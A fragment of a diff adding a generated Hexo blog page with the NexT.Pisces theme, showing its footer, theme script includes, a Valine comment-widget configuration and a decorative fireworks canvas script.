+        <a href="https://github.com/jangfan" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jangfan" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fan fan</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,100' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'Mck7Dy6F2oIhwijhmzrGcdqG-gzGzoHsz',
+      appKey     : '6xnXjGK9mDWbcv6boCozpd4m',
+      placeholder: "欢迎在此留下您的足迹# Comment box placeholder",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body> 
+</html>
+<!-- 爆炸烟花 -->
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/src/firework.js"></script>
+
